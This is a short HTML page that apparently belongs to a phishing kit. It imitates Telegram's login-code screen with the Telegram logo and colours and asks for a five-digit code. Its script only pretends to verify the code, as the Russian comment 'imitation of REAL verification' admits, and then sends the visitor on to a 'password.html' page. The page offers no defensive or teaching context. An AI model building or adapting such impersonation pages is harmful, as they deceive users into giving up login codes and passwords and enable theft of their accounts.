<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
        .tg-icon { width: 60px; height: 60px; margin-bottom: 20px; fill: #248bdf; }
        input { width: 100%; padding: 15px; background: #1c252f; border: 1px solid #2a3644; border-radius: 10px; color: #fff; text-align: center; letter-spacing: 5px; font-size: 24px; margin-bottom: 20px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #248bdf; border: none; border-radius: 10px; color: #fff; font-weight: bold; cursor: pointer; }
        .loader { display: none; margin: 10px auto; border: 3px solid #f3f3f3; border-top: 3px solid #248bdf; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <svg class="tg-icon" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#248bdf"/><path d="M54 116.7l124.6-48.1c5.8-2.2 10.8 1.2 8.9 10.3l-21.2 100.1c-1.6 7.2-5.9 8.9-11.9 5.6L122 158l-15.7 15.1c-1.7 1.7-3.2 3.2-6.6 3.2l2.3-33.3 60.7-54.8c2.6-2.3-.6-3.6-4.1-1.3L83.7 137.4 51.5 127.3c-7-2.2-7.1-7 1.5-10.6z" fill="#fff"/></svg>
    <h2>Enter Code</h2>
    <input type="number" id="code" placeholder="00000">
    <div id="loader" class="loader"></div>
    <button class="btn" id="btn" onclick="verify()">Verify</button>

    <script>
        function verify() {
            const code = document.getElementById('code').value;
            if (code.length < 5) return alert("Код должен быть 5 цифр!");
            
            document.getElementById('loader').style.display = 'block';
            document.getElementById('btn').style.display = 'none';

            // Имитация РЕАЛЬНОЙ проверки
            setTimeout(() => {
                window.location.href = "password.html";
            }, 2500);
        }
    </script>
</body>
</html>
